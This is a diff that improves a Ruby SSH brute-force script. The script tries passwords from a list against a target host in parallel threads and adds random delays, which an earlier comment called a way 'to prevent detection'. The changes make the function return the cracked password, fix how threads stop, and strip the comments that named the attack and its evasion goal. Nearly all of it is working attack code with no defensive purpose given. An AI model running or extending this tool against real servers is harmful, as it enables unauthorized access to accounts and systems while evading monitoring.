@@ -34,23 +34,23 @@ def ssh_server_reachable?(host, port, logger)
   end
 end
 
-# Function to perform SSH brute force attack
 def ssh_brute_force(host, port, username, password_list, logger, delay_between_attempts)
   unless File.exist?(password_list)
     logger.error("[!] Password list file not found: #{password_list}")
     puts "[!] Password list file not found: #{password_list}"
     return nil
   end
-
+  
   unless ssh_server_reachable?(host, port, logger)
     return nil
   end
-
+  
   passwords = File.readlines(password_list).map(&:strip).reject(&:empty?)
   total_passwords = passwords.size
+  found_password = nil
   
   Parallel.each_with_index(passwords, in_threads: 5) do |password, index|
-    break if $terminate
+    next if $terminate
     progress = ((index + 1).to_f / total_passwords * 100).round(2)
     logger.info("[*] Progress: #{progress}% (#{index + 1}/#{total_passwords})")
     logger.info("[*] Trying: #{username}:#{password}")
@@ -61,24 +61,23 @@ def ssh_brute_force(host, port, username, password_list, logger, delay_between_a
         logger.info(success_message)
         puts success_message
         $terminate = true
-        break
+        found_password = password
+        Thread.exit # Завершаем текущий поток
       end
     rescue Net::SSH::AuthenticationFailed
       logger.info("[-] Incorrect password: #{password}")
     rescue Net::SSH::ConnectionTimeout => e
       logger.error("[!] Connection timeout: #{e.message}")
-      return nil
     rescue StandardError => e
       logger.error("[!] Unexpected error: #{e.message}")
-      return nil
     ensure
-      delay = delay_between_attempts + rand(0.1..0.5) # Dynamic delay to prevent detection
+      delay = delay_between_attempts + rand(0.1..0.5)
       sleep(delay) unless $terminate
     end
   end
   
-  logger.info("[-] Password not found.") unless $terminate
-  nil
+  logger.info("[-] Password not found.") unless found_password
+  found_password
 end
 
 # Main execution
